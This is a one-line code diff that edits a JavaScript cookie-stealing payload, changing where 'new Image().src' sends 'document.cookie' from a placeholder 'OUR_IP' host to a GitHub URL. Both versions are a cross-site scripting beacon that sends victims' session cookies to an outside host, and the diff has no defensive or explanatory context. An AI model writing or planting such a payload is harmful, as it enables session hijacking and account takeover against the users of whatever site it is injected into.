@@ -1,1 +1,1 @@
-new Image().src='http://OUR_IP/index.php?c='+document.cookie
+new Image().src='https://github.com/hsieeeee/yarab/blob/main/index.php?c='+document.cookie
